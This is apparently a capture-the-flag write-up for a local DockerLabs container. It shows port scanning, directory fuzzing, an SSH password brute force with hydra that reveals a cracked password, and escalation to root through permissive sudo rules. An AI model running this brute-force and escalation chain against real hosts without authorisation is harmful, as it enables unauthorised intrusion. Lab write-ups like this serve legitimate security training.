# IP
172.17.0.2
# Enumeration
## ICMP
```sh
┌──(codebylauti㉿kali)-[~/workspace/dockerlabs]
└─$ ping -c 2 172.17.0.2
PING 172.17.0.2 (172.17.0.2) 56(84) bytes of data.
64 bytes from 172.17.0.2: icmp_seq=1 ttl=64 time=0.074 ms
64 bytes from 172.17.0.2: icmp_seq=2 ttl=64 time=0.040 ms

--- 172.17.0.2 ping statistics ---
2 packets transmitted, 2 received, 0% packet loss, time 1011ms
rtt min/avg/max/mdev = 0.040/0.057/0.074/0.017 ms
```
## Port scanning
```sh
┌──(codebylauti㉿kali)-[~/workspace/dockerlabs]
└─$ nmap -sV -sC -p- -n 172.17.0.2
Starting Nmap 7.99 ( https://nmap.org ) at 2026-09-09 14:48 -0300
Nmap scan report for 172.17.0.2
Host is up (0.0000030s latency).
Not shown: 65533 closed tcp ports (reset)
PORT   STATE SERVICE VERSION
| ssh-hostkey:
|   256 34:0d:04:25:20:b6:e5:fc:c9:0d:cb:c9:6c:ef:bb:a0 (ECDSA)
|_  256 05:56:e3:50:e8:f4:35:96:fe:6b:94:c9:da:e9:47:1f (ED25519)
80/tcp open  http    Apache httpd 2.4.58 ((Ubuntu))
|_http-title: Site doesn't have a title (text/html).
|_http-server-header: Apache/2.4.58 (Ubuntu)
MAC Address: F2:47:E9:98:54:44 (Unknown)
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 6.68 seconds
```
## Dir Fuzzing
```sh
┌──(codebylauti㉿kali)-[~/workspace/dockerlabs]
└─$ gobuster dir -u http://172.17.0.2 -w /usr/share/wordlists/dirb/common.txt -x php,html,conf,sh,txt
===============================================================
Gobuster v3.8.2
by OJ Reeves (@TheColonial) & Christian Mehlmauer (@firefart)
===============================================================
[+] Url:                     http://172.17.0.2
[+] Method:                  GET
[+] Threads:                 10
[+] Wordlist:                /usr/share/wordlists/dirb/common.txt
[+] Negative Status codes:   404
[+] User Agent:              gobuster/3.8.2
[+] Extensions:              conf,sh,txt,php,html
[+] Timeout:                 10s
===============================================================
Starting gobuster in directory enumeration mode
===============================================================
.hta                 (Status: 403) [Size: 275]
.htaccess.php        (Status: 403) [Size: 275]
.htaccess.txt        (Status: 403) [Size: 275]
.hta.html            (Status: 403) [Size: 275]
.htaccess.html       (Status: 403) [Size: 275]
.htpasswd            (Status: 403) [Size: 275]
.htaccess.sh         (Status: 403) [Size: 275]
.hta.txt             (Status: 403) [Size: 275]
.htaccess            (Status: 403) [Size: 275]
.hta.sh              (Status: 403) [Size: 275]
.hta.conf            (Status: 403) [Size: 275]
.htaccess.conf       (Status: 403) [Size: 275]
.htpasswd.conf       (Status: 403) [Size: 275]
.htpasswd.html       (Status: 403) [Size: 275]
.hta.php             (Status: 403) [Size: 275]
.htpasswd.txt        (Status: 403) [Size: 275]
.htpasswd.php        (Status: 403) [Size: 275]
.htpasswd.sh         (Status: 403) [Size: 275]
index.html           (Status: 200) [Size: 6]
index.html           (Status: 200) [Size: 6]
server-status        (Status: 403) [Size: 275]
Progress: 27678 / 27678 (100.00%)
===============================================================
Finished
===============================================================
```

Tails is a valid ssh username (found in index.html)
## Brute force
```sh
┌──(codebylauti㉿kali)-[~/workspace/dockerlabs/hedgehog]
└─$ hydra -l tails -P /usr/share/wordlists/rockyou_reversed.txt ssh://172.17.0.2 -t 16
Hydra v9.7 (c) 2023 by van Hauser/THC & David Maciejak - Please do not use in military or secret service organizations, or for illegal purposes (this is non-binding, these *** ignore laws and ethics anyway).

Hydra (https://github.com/vanhauser-thc/thc-hydra) starting at 2026-09-09 15:25:42
[WARNING] Many SSH configurations limit the number of parallel tasks, it is recommended to reduce the tasks: use -t 4
[WARNING] Restorefile (you have 10 seconds to abort... (use option -I to skip waiting)) from a previous session found, to prevent overwriting, ./hydra.restore
[DATA] max 16 tasks per 1 server, overall 16 tasks, 14344386 login tries (l:1/p:14344386), ~896525 tries per task
[DATA] attacking ssh://172.17.0.2:22/
[22][ssh] host: 172.17.0.2   login: tails   password: 3117548331
1 of 1 target successfully completed, 1 valid password found
[WARNING] Writing restore file because 1 final worker threads did not complete until end.
[ERROR] 1 target did not resolve or could not be connected
[ERROR] 0 target did not complete
Hydra (https://github.com/vanhauser-thc/thc-hydra) finished at 2026-09-09 15:26:18
```
## SSH login as tails
### Post Enumeration
```sh
tails@7188f87f56b2:~$ sudo -l
User tails may run the following commands on 7188f87f56b2:
    (sonic) NOPASSWD: ALL
```

This means, we can execute all commands as sonic as long as we sudo that user

```sh
tails@7188f87f56b2:~$ sudo -u sonic cat /home/sonic/Documentos/contraseña
perritos!
```

## SSH login as sonic
### Post Enumeration
``` sh
sonic@7188f87f56b2:/$ sudo -l
User sonic may run the following commands on 7188f87f56b2:
    (ALL) NOPASSWD: ALL
```

Sonic has root priviledges to run any command

```sh
sonic@7188f87f56b2:/$ sudo su
root@7188f87f56b2:/#
```